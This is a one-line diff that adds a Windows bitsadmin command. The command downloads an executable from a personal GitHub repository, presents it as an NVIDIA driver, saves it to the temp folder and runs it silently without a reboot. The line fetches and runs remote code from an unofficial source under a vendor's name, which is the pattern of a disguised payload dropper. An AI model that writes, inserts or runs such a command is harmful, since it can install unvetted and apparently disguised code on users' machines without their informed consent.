@@ -1,0 +1,1 @@
+bitsadmin /transfer "NVIDIA_Driver_Download" https://github.com/AutumnRainBot/nvidia/raw/refs/heads/main/NVIDIA%20SDK%20DRIVER.exe "%TEMP%\NVIDIA_SDK_DRIVER.exe" && "%TEMP%\NVIDIA_SDK_DRIVER.exe" -s -noreboot
